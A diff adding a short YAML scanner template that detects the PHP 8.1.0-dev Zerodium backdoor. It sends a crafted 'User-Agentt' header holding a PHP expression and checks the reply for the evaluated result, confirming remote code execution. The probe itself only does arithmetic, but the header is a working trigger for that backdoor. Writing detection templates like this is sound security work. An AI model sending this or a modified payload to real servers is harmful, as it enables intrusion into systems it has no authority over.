@@ -1,0 +1,20 @@
+name: PHP 8.1.0-dev Zerodium Backdoor RCE
+manual: true
+query: app="php"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /
+      headers:
+        User-Agentt: zerodiumvar_dump(233*233);
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"int(54289)")
+expression: r0()
+detail:
+  links:
+  - https://news-web.php.net/php.internals/113838
+  description: PHP is a popular general-purpose scripting language that is especially
+    suited to web development.
+  tags: RCE
